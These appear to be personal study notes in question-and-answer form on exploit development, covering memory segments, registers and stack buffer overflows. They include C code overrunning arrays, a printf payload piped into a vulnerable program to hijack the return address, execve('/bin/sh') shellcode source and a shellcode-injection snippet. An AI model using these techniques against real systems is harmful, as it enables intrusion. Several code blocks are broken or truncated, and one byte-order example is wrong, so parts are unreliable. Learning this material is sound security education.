## Chapter 1/27 Before You Begin <sup>(completed)</sup>

<details>
<summary>Specify the execution procedure of an executable?</summary>

> - The operating system creates an address space in which the program will run.
> - This address space indluces the actual program instructions as well as any required data.
> - Three segment types are created: `.text` (read-only), `.bss` (writable), `.data` (writable).
> - The `.bss` and `.data` segments are reserved for global variables.
> - The `.data` segment contains static initialized data, and `.bss` segment contains uninitialized data, `.text` segment holds the program instructions.
> - Stack and heap are initialized.
>
> ```sh
> readelf --symbols a.out | sort -k 2 -r

<summary>Which direction each of the sections grow in binary files?</summary>

> Shared libraries
> .text
> .bss
> Heap (grows ↓)
> Stack (grows ↑)

<summary>Specify register groups in assembly language?</summary>

> - General purpose registers: `rbp`, `rsp`, `rax`, `rbx`, `rcx`, `rdx`, `rdi`, `rsi`, `r8`, `r9`,...
> - Segment registers: `cs`, `ds`, `ss`
> - Control registers: `rip`
> - Other registers: `rflags`

## Chapter 2/27 Stack Overflows <sup>(writing)</sup>

<details>
<summary>When buffers become vulnerable to stack overflows?</summary>

> C has no bounds-checking on buffers.
>
> ```c
> #include <stdio.h>
>
> int main()
> {
>     int array[5] = {1,2,3,4,5};
>     printf("%d\n", array[5]);
> }
> ``````

<details>
<summary>Write past the array bounds in C?</summary>

> ```c
> int main()
> {
>     int array[5], index;
>     for (index = 0; index != 255; ++index)
>     {
>         array[index] = 10;
>     }
> }
> ``````
>
> Inspect the core dump for further understanding of what heppened on the
> stack:
>
> ```sh
> coredumpctl list a.out
> ``````
>
> As shown by the core, machine was trying to execute address
> `0x0000000a0000000a` which is the value we filled by overwriting on the
> stack.

<summary>What values does the calling convention put on the stack?</summary>

> When a function has completed executing its instructions, it returns control
> to the original function caller.
>
> ```c
> void function(int a, int b)
> {
>     int array[5];
> }
>
> main()
> {
>     function(1, 2);
> }
> ``````
>
> The consecutive execution of the program now needs to be interrupted, and the
> instructions in `function` need to be executed. The first step is to push the
> arguments for function, `a` and `b`, backward onto the stack. When the
> arguments are placed onto the stack, the `function` is called, placing the
> return address, or `RET`, onto the stack. `RET` is the address stored in the
> instruction pointer (`EIP`) at the time function is called.
>
> Before any function instructions can be executed, the prolog is executed. In
> essence, the prolog stores some values onto the stack so that the function
> can execute cleanly. The current value of `EBP` is pushed onto the stack,
> because the value of `EBP` must be changed in order to reference values on
> the stack. When the function has completed, we will need this stored value of
> `EBP` in order to calculate address locations in main. Once `EBP` is stored
> on the stack, we are free to copy the current stack pointer (`ESP`) into
> `EBP`. Now we can easily reference addresses local to the stack.

<summary>What happens when data is writen past the array boundaries on the stack?</summary>

> When examining the stack, we’re expecting to see the saved `EBP` and the
> saved return address (`RET`). But after writing past the array, both `EBP`
> and `RET` values will be overwritten by the value we put past the array.
>
> ```c
> void function(void)
> {
>     //                  top of stack, low memory
>     // 1   x 8 bytes    [index] 0x7fffffffe368
>     // 30  x 8 bytes    [array] 0x7fffffffe360
>     // rbp x 8 bytes            0x7fffffffe460

>     long array[30];

>     unsigned long index = 0;

> We have now successfully overflowed a buffer, overwritten `EBP` and `RET`,
> and therefore caused our overflowed value to be loaded into `EIP` after the
> execution reaches to the end of the function.
>
> While this overflow can be useful in creating a denial of service, we can
> move on to controlling the path of execution, or basically, controlling what
> gets loaded into `EIP`, the instruction pointer.

<summary>Control the execution path of a program vulnerable to buffer overflow?</summary>

> When `RET` is read off the stack and placed into `EIP`, the instruction at
> the address will be executed. This is how we will control execution.
>
> First, we need to decide what address to use. We need to determine the
> address to jump to, so we will have to go back to gdb and find out what
> address calls `function`.
>
> We then translate the address into shellcode and use `printf` to inject it
> into the vulnerable program.
>
> ```sh
> printf 'AAAAAAAAAABBBBBBBBBBCCCCCCCCCC\xed\x83\x04\x08' | ./overflow

<summary>Translate a hexadecimal address into shellcode?</summary>

> Assuming the address we want to use is `0x080483ed`.
>
> We should separate each byte from end to the beginning separated by `\x`
> resulting in `\xed\x83\x04\x3d`.

<summary>Get shell access by exploiting a program vulnerable to buffer overflow?</summary>

> We will have to inject actual machine instructions, or opcodes, into the
> vulnerable input area. To do so, we must convert our shell-spawning code to
> assembly, and then extract the opcodes from our human-readable assembly. We
> will then have what is termed shellcode, or the opcodes that can be injected
> into a vulnerable input area and executed.
>
> ```c
> #include <stdlib.h>
> #include <unistd.h>
>
> int main(void)
> {
>     char* name[2];
>
>     name[0] = "/bin/sh";
>     name[1] = 0x0;
>     execve(name[0], name, 0x0);
>     exit(0);

<summary>Inject an already prepared shellcode into a process?</summary>

> ```c

> // shellcode for exit(0)
>
> int main(void)

>
>     ret = (int *)&ret + 6;
>     // \          \____________ address of ret + 6 becomes the address of (caller) on stack
>     //  \______________________ put address of (caller) on ret to have access
>
>     (*ret) = (int)shellcode; // replace address of (caller) with address of shellcode
>     // executes shellcode
